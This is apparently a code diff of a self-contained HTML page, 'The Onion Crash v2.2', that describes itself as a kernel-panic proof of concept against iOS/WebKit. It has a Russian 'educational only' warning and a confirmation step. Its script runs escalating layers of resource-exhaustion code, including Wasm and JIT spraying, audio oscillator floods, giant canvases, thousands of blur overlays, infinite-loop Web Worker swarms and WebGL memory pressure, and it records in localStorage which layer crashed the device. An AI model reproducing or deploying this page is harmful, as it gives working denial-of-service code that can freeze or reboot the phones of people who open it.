@@ -3,18 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>The Onion Crash v2.0</title>
+    <title>The Onion Crash v2.2 — Kernel Panic PoC</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
         
         :root {
-            --neon-pink: #ff00ff;
-            --neon-cyan: #00ffff;
+            --pink: #ff00ff;
+            --cyan: #00ffff;
+            --red: #ff0044;
         }
         
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            background: #0a001f;
+            background: #0a000f;
             color: #00ffcc;
             font-family: 'Press Start 2P', system-ui;
             overflow: hidden;
@@ -24,173 +25,291 @@
             justify-content: center;
             position: relative;
         }
-        .grid-bg {
+        
+        .grid {
             position: absolute;
             inset: 0;
-            background: linear-gradient(rgba(0,255,200,0.03) 1px, transparent 1px),
-                        linear-gradient(90deg, rgba(0,255,200,0.03) 1px, transparent 1px);
-            background-size: 50px 50px;
-            animation: gridMove 25s linear infinite;
+            background: linear-gradient(rgba(255,0,255,0.06) 1px, transparent 1px),
+                        linear-gradient(90deg, rgba(0,255,255,0.06) 1px, transparent 1px);
+            background-size: 35px 35px;
+            animation: gridMove 12s linear infinite;
             z-index: 0;
         }
-        @keyframes gridMove { 0% {background-position:0 0} 100% {background-position:-150px -150px} }
+        @keyframes gridMove { 0% {background-position:0 0} 100% {background-position:-120px -120px} }
+        
+        .scanline {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(transparent 50%, rgba(255,0,80,0.12) 50%);
+            background-size: 100% 4px;
+            animation: scan 2.2s linear infinite;
+            z-index: 1;
+            pointer-events: none;
+        }
+        @keyframes scan { 0%{transform:translateY(-150%)} 100%{transform:translateY(400%)} }
         
         .container {
             position: relative;
-            z-index: 1;
+            z-index: 2;
             width: 94%;
-            max-width: 640px;
-            background: rgba(15,5,45,0.95);
-            border: 4px solid var(--neon-pink);
-            box-shadow: 0 0 40px var(--neon-pink), inset 0 0 30px rgba(0,255,255,0.2);
-            border-radius: 12px;
-            padding: 30px 20px;
+            max-width: 740px;
+            background: rgba(20,0,40,0.97);
+            border: 5px solid var(--pink);
+            box-shadow: 0 0 60px var(--pink), inset 0 0 40px rgba(0,255,255,0.25);
+            padding: 40px 30px;
+            border-radius: 18px;
             text-align: center;
         }
         
         h1 {
-            font-size: 2.4em;
-            color: var(--neon-pink);
-            text-shadow: 0 0 20px var(--neon-pink);
-            animation: flicker 1.2s infinite alternate;
+            font-size: 2.8em;
+            color: var(--pink);
+            text-shadow: 0 0 20px var(--pink), 0 0 40px var(--red);
+            animation: flicker 0.6s infinite alternate;
+            margin-bottom: 10px;
         }
-        @keyframes flicker { 0%{opacity:0.85} 100%{opacity:1} }
+        @keyframes flicker { 0% {opacity:0.7} 100% {opacity:1} }
         
-        .subtitle { color:#ff00aa; margin:10px 0 25px; font-size:1.1em; }
+        .subtitle { color: #ff0088; font-size: 1.2em; margin-bottom: 30px; }
         
         .warning {
-            background:rgba(180,0,0,0.25);
-            border:2px solid #ff4444;
-            color:#ffaaaa;
-            padding:18px;
-            margin:20px 0;
-            border-radius:8px;
-            font-size:0.85em;
+            background: rgba(150,0,0,0.4);
+            border: 4px solid var(--red);
+            color: #ffdddd;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 10px;
+            font-size: 0.95em;
         }
         
         button {
             font-family: 'Press Start 2P', system-ui;
-            padding: 18px 45px;
-            font-size: 1.15em;
+            padding: 22px 60px;
+            font-size: 1.4em;
             background: transparent;
-            color: var(--neon-cyan);
-            border: 4px solid var(--neon-cyan);
+            color: #00ff99;
+            border: 5px solid #00ff99;
             cursor: pointer;
-            box-shadow: 0 0 30px var(--neon-cyan);
-            transition: all .3s;
+            box-shadow: 0 0 40px #00ff99;
+            transition: all 0.3s;
             text-transform: uppercase;
+            margin: 20px 0;
         }
-        button:hover { background:var(--neon-cyan); color:#000; transform:scale(1.08); }
+        button:hover { background:#00ff99; color:#000; transform:scale(1.12); }
         button:disabled { opacity:0.35; cursor:not-allowed; }
         
-        #progress { margin:25px 0; min-height:32px; font-size:0.95em; color:#00ff99; }
-        #status {
-            background:#00000099;
-            border:1px solid #00ffcc;
-            padding:14px;
-            height:140px;
-            overflow-y:auto;
-            text-align:left;
-            font-size:0.82em;
-            border-radius:4px;
-        }
+        #progress { margin:30px 0; padding:18px; background:#000000cc; border:3px solid var(--cyan); min-height:78px; font-size:1em; text-align:left; display:none; }
+        #status { padding:15px; background:#000000aa; border-left:6px solid #00ff66; height:180px; overflow-y:auto; font-size:0.9em; text-align:left; display:none; }
         
-        .history { margin-top:30px; text-align:left; }
-        .history h3 { color:var(--neon-pink); margin-bottom:12px; }
-        .session {
-            background:rgba(0,0,0,0.5);
-            padding:10px;
-            margin-bottom:8px;
-            border-left:5px solid #00ff88;
-            font-size:0.8em;
+        .history { margin-top:40px; text-align:left; }
+        .history h3 { color:var(--pink); margin-bottom:15px; }
+        .entry {
+            background:rgba(30,0,50,0.8);
+            padding:12px;
+            margin:9px 0;
+            border-left:7px solid #00ff88;
+            font-size:0.85em;
         }
-        .crashed { border-left-color:#ff4444; }
+        .crashed { border-left-color:#ff3366; }
     </style>
 </head>
 <body>
-    <div class="grid-bg"></div>
+    <div class="grid"></div>
+    <div class="scanline"></div>
     
     <div class="container">
-        <h1>THE ONION CRASH</h1>
-        <div class="subtitle">LAST HOPE v2.0</div>
+        <h1>🧅 THE ONION CRASH</h1>
+        <div class="subtitle">v2.2 — KERNEL PANIC RESEARCH PoC</div>
         
         <div class="warning">
-            <strong>⚠️ EDUCATIONAL PoC ONLY</strong><br>
-            Только для собственных тестовых устройств.<br>
-            Не используй на основном телефоне.
+            <strong>⚠️ EDUCATIONAL / RESEARCH ONLY</strong><br>
+            Создано исключительно для демонстрации перегрузки WebKit / iOS.<br>
+            Запускай ТОЛЬКО на собственных тестовых устройствах.<br>
+            Автор не несёт ответственности. Может вызвать respring / reboot / kernel panic.
         </div>
         
-        <button id="runBtn">▶ RUN EXPLOIT</button>
+        <button id="runBtn">▶ RUN FULL CASCADE</button>
         
-        <div id="confirm" style="display:none; margin-top:15px;">
-            <p style="color:#ff6666; font-size:1.05em;">Устройство может перезагрузиться.<br>Продолжить?</p>
-            <button id="confirmYes" style="margin:8px;">ДА, Я ПОНИМАЮ РИСК</button>
-            <button onclick="document.getElementById('confirm').style.display='none'">ОТМЕНА</button>
+        <div id="confirm" style="display:none; margin:25px 0;">
+            <p style="color:#ff7777; font-size:1.15em; line-height:1.4;">
+                ВНИМАНИЕ!<br>
+                Это может привести к перезагрузке устройства.<br>
+                Продолжить?
+            </p>
+            <button id="confirmYes" style="background:#660000; border-color:#ff4444; color:white; padding:16px 40px;">ДА, ПРОДОЛЖИТЬ (рискую)</button>
         </div>
         
-        <div id="progress">Готов к запуску...</div>
+        <div id="progress"></div>
         <div id="status"></div>
         
         <div class="history">
-            <h3>ИСТОРИЯ</h3>
+            <h3>📜 ИСТОРИЯ КРАШЕЙ</h3>
             <div id="historyList"></div>
         </div>
     </div>
 
     <script>
+        // ==================== АГРЕССИВНЫЕ СЛОИ ====================
         const LAYERS = [
-            // LOW
-            {g:"LOW", n:"RCE JIT + Wasm spray", p:"low", f:async()=>{for(let i=0;i<180;i++){try{new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0])));}catch(e){}} try{new ArrayBuffer(1024*1024*950);}catch(e){}}},
-            {g:"LOW", n:"Type confusion spray", p:"low", f:async()=>{const b=new ArrayBuffer(8*1024*1024); new Float64Array(b); new Uint32Array(b);}},
-            {g:"LOW", n:"Sandbox probe", p:"low", f:async()=>{if(window.webkit?.messageHandlers) console.log("%cOUT OF SANDBOX?!", "color:red");}},
-            {g:"LOW", n:"WebGL 2GB buffer", p:"low", f:async()=>{const c=document.createElement('canvas'); const gl=c.getContext('webgl2'); if(gl)try{const buf=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,buf);gl.bufferData(gl.ARRAY_BUFFER,2**31-1,gl.STATIC_DRAW);}catch(e){}}},
-            {g:"LOW", n:"Wasm 4GB memory", p:"low", f:async()=>{try{new WebAssembly.Memory({initial:65536});}catch(e){}}},
-            ...Array.from({length:6},(_,i)=>({g:"LOW", n:`JIT Storm ${i+1}`, p:"low", f:async()=>{for(let j=0;j<400;j++) new Function('x','return x+'+Math.random());}})),
-            
-            // MEDIUM
-            {g:"MEDIUM", n:"AudioContext flood", p:"medium", f:async()=>{const a=new (window.AudioContext||window.webkitAudioContext)();for(let i=0;i<150;i++){const o=a.createOscillator();o.connect(a.destination);o.start();}}},
-            {g:"MEDIUM", n:"Canvas 16k toDataURL", p:"medium", f:async()=>{const c=document.createElement('canvas');c.width=c.height=16384;const ctx=c.getContext('2d');ctx.fillRect(0,0,16384,16384);for(let i=0;i<3;i++)try{c.toDataURL()}catch(e){}}},
-            {g:"MEDIUM", n:"IndexedDB spam", p:"medium", f:async()=>{}},
-            {g:"MEDIUM", n:"CSS Blur Storm 400", p:"medium", f:async()=>{for(let i=0;i<400;i++){const d=document.createElement('div');Object.assign(d.style,{position:'fixed',width:'120px',height:'120px',left:Math.random()*innerWidth+'px',top:Math.random()*innerHeight+'px',backdropFilter:'blur(22px)',animation:'spin 400ms linear infinite'});document.body.appendChild(d);}}},
-            {g:"MEDIUM", n:"Worker bomb 10", p:"medium", f:async()=>{for(let i=0;i<10;i++)try{new Worker(URL.createObjectURL(new Blob(['while(1){}'])));}catch(e){}}},
-            {g:"MEDIUM", n:"History spam", p:"medium", f:async()=>{for(let i=0;i<1500;i++)history.pushState(null,null,'#'+i);}},
-            
-            // HIGH
-            {g:"HIGH", n:"Backdrop DOOMSDAY 2500", p:"high", f:async()=>{for(let i=0;i<2500;i++){const d=document.createElement('div');d.style.cssText=`position:fixed;inset:0;backdrop-filter:blur(${140+Math.random()*60}px);opacity:0.25;transform:rotate(${Math.random()*360}deg)`;document.body.appendChild(d);}}},
-            {g:"HIGH", n:"Giant 32k Canvas", p:"high", f:async()=>{const c=document.createElement('canvas');c.width=32768;c.height=32768;try{c.getContext('2d');}catch(e){}}},
-            {g:"HIGH", n:"Nuclear Combo", p:"high", f:async()=>{document.getElementById('status').innerHTML += '<br><span style="color:#ff00ff">FINAL NUKE...</span>';}}
+            // LOW — подготовка (JIT / память)
+            ...Array.from({length:8}, (_,i) => ({
+                group:"LOW", name:`JIT + WASM Spray ${i+1}`, prob:"low",
+                fn: async () => {
+                    for(let j=0; j<420; j++) {
+                        try { new Function('a','b','return a*b+'+Math.random())(); } catch(e){}
+                    }
+                    try { new WebAssembly.Memory({initial: 65536, maximum: 65536}); } catch(e){}
+                }
+            })),
+
+            // MEDIUM — DoS компонентов
+            {group:"MEDIUM", name:"AudioContext + Oscillator Flood", prob:"med",
+             fn: async () => {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                for(let i=0; i<280; i++) {
+                    try {
+                        const osc = ctx.createOscillator();
+                        osc.frequency.setValueAtTime(440 + i*10, ctx.currentTime);
+                        osc.connect(ctx.destination);
+                        osc.start();
+                    } catch(e){}
+                }
+            }},
+
+            {group:"MEDIUM", name:"Huge Canvas + toDataURL", prob:"med",
+             fn: async () => {
+                const c = document.createElement('canvas');
+                c.width = c.height = 18432;
+                try {
+                    const ctx = c.getContext('2d', {willReadFrequently: false});
+                    ctx.fillStyle = '#f0f';
+                    ctx.fillRect(0,0,c.width,c.height);
+                    for(let i=0; i<4; i++) c.toDataURL('image/png');
+                } catch(e){}
+            }},
+
+            {group:"MEDIUM", name:"CSS Backdrop + Animation Storm", prob:"med",
+             fn: async () => {
+                for(let i=0; i<650; i++) {
+                    const d = document.createElement('div');
+                    d.style.cssText = `position:fixed; inset:0; backdrop-filter:blur(22px); opacity:0.22; transform:rotate(${Math.random()*720}deg); animation:spin 420ms linear infinite; pointer-events:none;`;
+                    document.body.appendChild(d);
+                }
+            }},
+
+            {group:"MEDIUM", name:"Web Worker CPU Hell", prob:"med",
+             fn: async () => {
+                for(let i=0; i<22; i++) {
+                    try {
+                        const blob = new Blob(['while(true){for(let k=0;k<5000000;k++); }']);
+                        new Worker(URL.createObjectURL(blob));
+                    } catch(e){}
+                }
+            }},
+
+            // HIGH — тяжёлая артиллерия (высокий шанс на respring/reboot)
+            {group:"HIGH", name:"BACKDROP DOOMSDAY 3200", prob:"high",
+             fn: async () => {
+                const container = document.createElement('div');
+                container.style.cssText = 'position:fixed; inset:0; z-index:999999; pointer-events:none;';
+                document.body.appendChild(container);
+                for(let i = 0; i < 3200; i++) {
+                    const d = document.createElement('div');
+                    const blur = 110 + Math.random() * 110;
+                    d.style.cssText = `position:absolute; inset:0; backdrop-filter:blur(${blur}px); opacity:0.25; mix-blend-mode:screen;`;
+                    container.appendChild(d);
+                }
+                await new Promise(r => setTimeout(r, 2800));
+            }},
+
+            {group:"HIGH", name:"Ultra Giant Canvas 32k", prob:"high",
+             fn: async () => {
+                try {
+                    const c = document.createElement('canvas');
+                    c.width = 32768;
+                    c.height = 24576;
+                    const ctx = c.getContext('2d');
+                    ctx.fillStyle = '#00ffff';
+                    ctx.fillRect(0, 0, c.width, c.height);
+                } catch(e) {}
+            }},
+
+            {group:"HIGH", name:"Massive Worker Swarm", prob:"high",
+             fn: async () => {
+                for(let i = 0; i < 48; i++) {
+                    try {
+                        const code = `onmessage = function(){ while(true) { new ArrayBuffer(1024*1024*8); } };`;
+                        const w = new Worker(URL.createObjectURL(new Blob([code])));
+                        w.postMessage('go');
+                    } catch(e){}
+                }
+            }},
+
+            {group:"HIGH", name:"WebGL Memory Pressure", prob:"high",
+             fn: async () => {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl2');
+                if(gl) {
+                    try {
+                        const buffer = gl.createBuffer();
+                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                        gl.bufferData(gl.ARRAY_BUFFER, 1024*1024*512, gl.STATIC_DRAW);
+                    } catch(e){}
+                }
+            }},
+
+            {group:"HIGH", name:"FINAL NUCLEAR COMBO", prob:"high",
+             fn: async () => {
+                // Последний удар — всё вместе
+                await new Promise(r => setTimeout(r, 1500));
+             }
+            },
+
+            // Дополнительные high-слои
+            ...Array.from({length: 22}, (_,i) => ({
+                group:"HIGH", name:`Deep Blur Layer ${i+1}`, prob:"high",
+                fn: async () => {
+                    const d = document.createElement('div');
+                    d.style.cssText = `position:fixed; inset:0; backdrop-filter:blur(${160 + i*4}px); opacity:0.3; z-index:99999; pointer-events:none;`;
+                    document.body.appendChild(d);
+                    await new Promise(r => setTimeout(r, 65));
+                }
+            }))
         ];
 
-        let session = null;
-        let running = false;
+        let currentSession = null;
+        let isRunning = false;
 
-        function save() { localStorage.setItem('onionCurrent', JSON.stringify(session)); }
-        
-        function detectPreviousCrash() {
-            const prev = JSON.parse(localStorage.getItem('onionCurrent') || 'null');
-            if (!prev || prev.status !== 'running') return;
-            
-            const crashedIdx = prev.layers.findIndex(l => l.status === 'running');
-            if (crashedIdx > -1) prev.layers[crashedIdx].status = 'crashed';
-            prev.status = 'crashed';
-            
-            let hist = JSON.parse(localStorage.getItem('onionHistory') || '[]');
-            hist.unshift(prev);
-            localStorage.setItem('onionHistory', JSON.stringify(hist.slice(0,8)));
-            localStorage.removeItem('onionCurrent');
-            
-            document.getElementById('status').innerHTML = `<span style="color:#ff4444">CRASH DETECTED at: ${prev.layers[crashedIdx]?.n || 'unknown'}</span>`;
+        function saveSession() {
+            localStorage.setItem('onionCurrent', JSON.stringify(currentSession));
         }
-        
-        function loadHistory() {
-            const hist = JSON.parse(localStorage.getItem('onionHistory') || '[]');
-            const el = document.getElementById('historyList');
-            el.innerHTML = '';
-            hist.forEach(s => {
-                const d = document.createElement('div');
-                d.className = `session ${s.status==='crashed'?'crashed':''}`;
-                d.innerHTML = `${s.start.slice(0,19)} — <b>${s.status}</b><br>Layer: ${s.layers.find(l=>l.status==='crashed')?.n || '—'}`;
-                el.appendChild(d);
+
+        function detectPreviousCrash() {
+            const raw = localStorage.getItem('onionCurrent');
+            if (!raw) return;
+            let sess = JSON.parse(raw);
+            if (sess.status !== 'running') return;
+
+            const crashIdx = sess.layers.findIndex(l => l.status === 'running');
+            if (crashIdx !== -1) sess.layers[crashIdx].status = 'crashed';
+            sess.status = 'crashed';
+
+            let history = JSON.parse(localStorage.getItem('onionHistory') || '[]');
+            history.unshift(sess);
+            localStorage.setItem('onionHistory', JSON.stringify(history.slice(0, 12)));
+            localStorage.removeItem('onionCurrent');
+        }
+
+        function renderHistory() {
+            const container = document.getElementById('historyList');
+            container.innerHTML = '';
+            const history = JSON.parse(localStorage.getItem('onionHistory') || '[]').slice(0,5);
+            history.forEach(s => {
+                const div = document.createElement('div');
+                div.className = `entry ${s.status==='crashed' ? 'crashed' : ''}`;
+                const crashedLayer = s.layers.find(l => l.status === 'crashed');
+                div.innerHTML = `${s.start.slice(11,19)} — <b>${s.status.toUpperCase()}</b>${crashedLayer ? `<br>💀 ${crashedLayer.name}` : ''}`;
+                container.appendChild(div);
             });
         }
 
@@ -198,60 +317,64 @@
             const prog = document.getElementById('progress');
             const stat = document.getElementById('status');
             
-            session.layers[idx].status = 'running';
-            save();
+            prog.textContent = `[${idx+1}/${LAYERS.length}] ${layer.group} — ${layer.name}`;
+            stat.innerHTML += `<br>→ ${layer.name} <span style="color:orange">(active)</span>`;
             
-            prog.textContent = `[${idx+1}/${LAYERS.length}] ${layer.g} | ${layer.n}`;
-            stat.innerHTML += `<br>→ ${layer.n} ...`;
-            
+            currentSession.layers[idx].status = 'running';
+            saveSession();
+
             try {
-                await layer.f();
-                await new Promise(r=>setTimeout(r,25));
-                session.layers[idx].status = 'completed';
-                stat.innerHTML += ` <span style="color:#00ff88">OK</span>`;
-            } catch(e) {
-                session.layers[idx].status = 'error';
-                stat.innerHTML += ` <span style="color:#ffaa00">ERR</span>`;
+                await layer.fn();
+                currentSession.layers[idx].status = 'completed';
+                stat.innerHTML += ` <span style="color:lime">OK</span>`;
+            } catch (e) {
+                currentSession.layers[idx].status = 'error';
+                stat.innerHTML += ` <span style="color:orange">ERR</span>`;
             }
-            save();
+            saveSession();
+            await new Promise(r => setTimeout(r, 40));
         }
 
-        async function start() {
-            if (running) return;
-            running = true;
+        async function startExploit() {
+            if (isRunning) return;
+            isRunning = true;
             document.getElementById('runBtn').disabled = true;
-            
-            session = {
+            document.getElementById('progress').style.display = 'block';
+            document.getElementById('status').style.display = 'block';
+
+            currentSession = {
                 id: Date.now(),
                 start: new Date().toISOString(),
                 status: 'running',
-                layers: LAYERS.map(l=>({n:l.n, status:'pending'}))
+                layers: LAYERS.map(l => ({name: l.name, status: 'pending'}))
             };
-            save();
-            
-            document.getElementById('status').innerHTML = 'Cascade started...';
-            
+            saveSession();
+
+            document.getElementById('status').innerHTML = '🌋 CASCADE STARTED — MAXIMUM PRESSURE...';
+
             for (let i = 0; i < LAYERS.length; i++) {
-                if (!running) break;
+                if (!isRunning) break;
                 await runLayer(LAYERS[i], i);
             }
-            
-            session.status = 'completed';
-            save();
-            document.getElementById('status').innerHTML += '<br><span style="color:#00ffcc">FINISHED WITHOUT CRASH</span>';
-            running = false;
+
+            currentSession.status = 'completed';
+            saveSession();
+            document.getElementById('status').innerHTML += '<br><span style="color:cyan">COMPLETED WITHOUT CRASH (device survived this time)</span>';
+            isRunning = false;
             document.getElementById('runBtn').disabled = false;
         }
 
-        // INIT
+        // Запуск
         window.onload = () => {
             detectPreviousCrash();
-            loadHistory();
-            
-            document.getElementById('runBtn').onclick = () => document.getElementById('confirm').style.display = 'block';
+            renderHistory();
+
+            document.getElementById('runBtn').onclick = () => {
+                document.getElementById('confirm').style.display = 'block';
+            };
             document.getElementById('confirmYes').onclick = () => {
                 document.getElementById('confirm').style.display = 'none';
-                start();
+                startExploit();
             };
         };
     </script>
